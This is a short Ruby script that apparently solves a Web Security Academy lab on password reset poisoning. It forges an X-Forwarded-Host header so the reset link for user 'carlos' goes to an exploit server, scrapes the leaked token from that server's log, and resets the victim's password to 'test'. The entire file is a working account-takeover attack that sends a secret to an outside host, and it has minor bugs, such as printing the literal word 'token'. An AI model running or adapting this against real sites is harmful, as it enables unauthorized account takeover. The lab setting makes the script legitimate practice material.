require 'http'
require 'nokogiri'

#1. Issue password reset token
url='https://0a4c00a8030d91fd80c73660004800ee.web-security-academy.net/forgot-password'

client = HTTP.headers(:'x-forwarded-host'=>"exploit-0a85004c033b91ef80c2359901980013.exploit-server.net/").post(url,:form=>{:username=>"carlos"})

#2. Get the password reset token from exploit server logs
url2='https://exploit-0a85004c033b91ef80c2359901980013.exploit-server.net/log'
token=''
client2 = HTTP.get(url2)
resph = Nokogiri.parse client2.body.to_s
resph.search(:css,"pre.container").to_s.split("\n").each {|d| token=d.split('=')[1].split()[0] if d.include?"token"}
puts "Password reset token: token"

#3. Reset password
url2="https://0a4c00a8030d91fd80c73660004800ee.web-security-academy.net/forgot-password?temp-forgot-password-token=#{token}"

client3 = HTTP.post(url,:form => {:"temp-forgot-password-token"=>"#{token}","new-password-1"=>"test",:"new-password-2"=>"test"})

puts "Password changed to: test"
